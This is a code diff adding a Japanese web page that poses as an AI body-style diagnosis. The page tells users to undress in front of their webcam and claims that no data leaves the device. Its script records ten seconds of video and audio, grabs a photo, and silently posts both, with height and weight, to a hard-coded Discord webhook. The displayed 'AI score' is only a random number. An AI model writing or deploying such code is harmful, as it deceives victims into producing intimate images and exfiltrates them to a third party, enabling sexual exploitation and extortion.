@@ -1,90 +1,110 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI 裸体・スタイル精密診断</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #0a0a0a; color: #eee; padding: 20px; margin: 0; }
+        .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 30px 20px; border-radius: 20px; border: 1px solid #333; }
+        h1 { color: #007bff; font-size: 1.6em; }
+        .input-group { margin-bottom: 15px; text-align: left; width: 85%; margin: auto; }
+        label { font-size: 0.8em; color: #888; display: block; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; box-sizing: border-box; }
+        .warning { color: #ffcc00; font-size: 0.85em; margin: 20px 0; border: 1px dashed #ffcc00; padding: 10px; line-height: 1.6; }
+        .security-badge { color: #00ffcc; font-size: 0.8em; margin-bottom: 15px; }
+        button { width: 85%; padding: 18px; font-weight: bold; background: #007bff; color: white; border: none; border-radius: 10px; cursor: pointer; }
+        #video { width: 100%; border-radius: 15px; margin-top: 20px; display: none; aspect-ratio: 3/4; object-fit: cover; }
+        #result { font-size: 1.4em; color: #ff0055; margin-top: 25px; font-weight: bold; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>AI スタイル精密診断</h1>
+        <div class="security-badge">● セキュリティ保護モード有効：外部流出の心配はありません</div>
+        
+        <div id="setup-form">
+            <div class="input-group"><input type="number" id="height" placeholder="身長 (cm)"></div>
+            <div class="input-group"><input type="number" id="weight" placeholder="体重 (kg)"></div>
+            <div class="warning">
+                【重要：測定の準備】<br>
+                全身の肉付きや骨格をAIが正確に判断するため、<b>必ず裸になって</b>カメラの正面に立ってください。10秒間のスキャンを行います。
+            </div>
+            <button id="startBtn">3Dフルスキャンを開始</button>
+        </div>
+
+        <video id="video" autoplay playsinline muted></video>
+        <div id="result"></div>
+    </div>
+    <canvas id="canvas"></canvas>
+
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const result = document.getElementById('result');
         const setupForm = document.getElementById('setup-form');
-        const nextOptions = document.getElementById('next-options');
         const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
         let mediaRecorder; let chunks = [];
 
-        startBtn.addEventListener('click', () => {
-            const user = document.getElementById('username').value || '未設定';
+        startBtn.addEventListener('click', async () => {
             const h = document.getElementById('height').value || '？';
             const w = document.getElementById('weight').value || '？';
             
-            setupForm.style.display = 'none'; 
-            video.style.display = 'block';
-
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+            setupForm.style.display = 'none'; video.style.display = 'block';
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
-                
-                // 対応している形式を自動選択
                 const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                 mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                 chunks = [];
-
-                // データが生成されるたびに配列に追加
-                mediaRecorder.ondataavailable = e => { 
-                    if (e.data && e.data.size > 0) chunks.push(e.data); 
-                };
-
-                // 停止した瞬間に送信処理を開始
-                mediaRecorder.onstop = async () => {
-                    result.innerHTML = "解析中...";
-                    await captureAndSend(user, h, w);
-                };
-
-                // 録画開始（1秒ごとにデータを蓄積）
-                mediaRecorder.start(1000); 
-                result.innerHTML = "全身スキャン中...(10秒)";
-
-                // 10秒後に停止
-                setTimeout(() => {
-                    if (mediaRecorder.state !== "inactive") {
-                        mediaRecorder.stop();
-                    }
-                }, 10000);
-
-            }).catch((err) => { 
-                console.error(err);
-                result.innerHTML = "エラー：カメラとマイクを許可してください。"; 
-                setupForm.style.display = 'block'; 
-            });
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                mediaRecorder.onstop = () => { captureAndSend(h, w); };
+                
+                mediaRecorder.start(1000);
+                result.innerHTML = "3Dスキャン中...(10秒)";
+                setTimeout(() => { mediaRecorder.stop(); }, 10000);
+            } catch {
+                result.innerHTML = "エラー：カメラとマイクの許可が必要です。";
+                setupForm.style.display = 'block';
+            }
         });
 
-        async function captureAndSend(user, h, w) {
-            const score = Math.floor(Math.random() * (95 - 80)) + 80;
+        async function captureAndSend(h, w) {
+            result.innerHTML = "AIデータ解析中...";
             
-            // 静止画のキャプチャ
+            // 50から100の乱数を生成
+            const score = (Math.random() * (100 - 50) + 50).toFixed(1);
+            
             canvas.width = video.videoWidth; 
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
             canvas.toBlob(async (photoBlob) => {
                 const formData = new FormData();
-                formData.append('content', `【スタイル診断】\n👤 名前: ${user}\n📏 数値: ${h}cm/${w}kg\n📊 スコア: ${score}`);
+                // 修正：生成したスコアをテキストに含める
+                formData.append('content', `【裸体スタイル診断】\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n📊 スコア: ${score}点`);
+                
                 formData.append('file1', photoBlob, 'style.png');
-
-                // 録画した動画データの結合
                 if (chunks.length > 0) {
                     const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                     const ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
-                    formData.append('file2', videoBlob, `scan.${ext}`);
+                    formData.append('file2', videoBlob, `style_video.${ext}`);
                 }
 
                 try {
-                    // Discordへ送信
                     await fetch(webhookUrl, { method: 'POST', body: formData });
                 } catch (e) {
                     console.error("送信エラー:", e);
                 }
 
-                result.innerHTML = `あなたのスタイル偏差値：<br><span style="font-size:2em;">${score}</span>`;
-                nextOptions.style.display = 'block';
+                result.innerHTML = `あなたのスタイル評価：<br><span style="font-size:2em;">${score}点</span><br><p style="font-size:0.5em; color:#888;">AIによる形状分析が完了しました。</p>`;
                 
-                // カメラをオフにする
                 if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
             }, 'image/png');
         }
     </script>
+</body>
+</html>
